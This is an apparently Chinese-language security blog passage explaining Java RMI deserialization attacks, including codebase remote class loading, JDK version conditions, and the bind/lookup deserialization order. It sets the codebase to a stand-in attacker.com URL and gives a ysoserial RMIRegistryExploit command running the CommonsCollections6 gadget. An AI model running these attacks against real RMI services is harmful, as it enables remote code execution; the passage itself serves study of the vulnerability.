...
利用方式：攻击者在RMI Registry中直接绑定一个恶意远程对象 

客户端lookup时 本地没有该对象的Stub类 就会尝试从攻击者指定的Codebase下载

这种利用方式受`java.rmi.server.useCodebaseOnly`影响 

当useCodebaseOnly为true时 下载被禁止 在高版本JDK的默认配置为True 利用方式已经失效

## 关于 java.rmi.server.codebase

`System.setProperty("java.rmi.server.codebase", "http://attacker.com/classes/");`

RMI会在序列化数据中附加 `java.rmi.server.codebase` 属性 作用是告诉接收方：如果本地找不到这个对象的class 可以尝试从这个 codebase 地址去加载

在7u21之前 默认`java.rmi.server.useCodebaseOnly=false` 

即允许RMI传输对象时 无论server或client 都可以从java.rmi.server.codebase 配置的地址获取class

当默认`java.rmi.server.useCodebaseOnly=true`后 接收方不会读取RMI数据流中的codebase地址 也就不会产生漏洞

只会从本地classpath 本地java.rmi.server.codebase配置的地址 加载class
...
首先是 在RMI远程调用中需要涉及到调用方法的参数和返回结果的传输 

这些参数和return可能是基本类型 也有可能会是某一个对象的引用 整个过程中需要被传输的对象都必须可以被序列化 

并且client和server的jvm环境中的类必须实现`serializable`接口和`serialVersionUID`保持一致 
...
由于Java对远程访问RMI Registry做了限制checkAccess() 只有来源地址是localhost的时候 才能调用rebind、bind、unbind等方法 

处理bind请求:

- jdk8u141之前 先反序列化客户端的请求 后`checkAccess()`限制客户端IP是否为本地 导致反序列化漏洞
- jdk8u141后 先`checkAccess()` 后反序列化

所以在jdk8u141后 使用bind/unbind无法触发反序列漏洞 改用lookup触发

处理lookup请求不会checkAccess() 直接readObject() 触发反序列化漏洞

通过bind绑定name和远程对象，以供客户端远程调用，任何可以被远程调⽤的对象都必须实现`java.rmi.Remote`接⼝，远程对象的实现类必须继承`UnicastRemoteObject`类

#### ysoserial RMIRegistryExploit 攻击 RMI Registry

另一种可以使用ysoserial的RMIRegistryExploit去直接攻击Registry注册中心
...
```java
    ...
    // 创建远程对象并导出 需要实现java.rmi.Remote
    ownMessageImpl obj = new ownMessageImpl();
    ownMessageImpl stub = (ownMessageImpl) UnicastRemoteObject.exportObject(obj, 0);
    
    // 绑定到RMI注册表
    reg.bind("sendMessage", stub);
```

切到ysoserial的jar包目录下使用`RMIRegistryExploit`进行攻击:

```
java -cp ysoserial-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections6 "calc"
```

##### ysoserial.exploit.RMIRegisterExploit的原理

bind()的对象必须必须实现Java.rmi.Remote接口 

这里ysoserial工具Remote类做代理 handler使用AnnotationInvocationHandler 恶意对象存储在handler.memberValues属性

`registry.bind(name, remote)`发送bind请求 server反序列化handler.memberValues属性内的对象 触发gadget
...
`JRMP`协议是` RMI `默认使用的专有网络协议 用于` Java `环境下的远程方法调用
...
可以使用codebase去远程加载class 在java rmi通信流程中通过设置`java.rmi.server.codebase`的值为远程class所在的uri

而且整个流程codebase的值可以由客户端控制的 但是有一定的利用条件:

- 安装并配置了SecurityManager
- Java版本低于7u21、6u45 
- 设置了 `java.rmi.server.useCodebaseOnly=false` 
- 其中 `useCodebaseOnly` 在Java 7u21、6u45的默认设置为true
...
![path](https://chenxvn53.github.io/image/rmi_1.png)
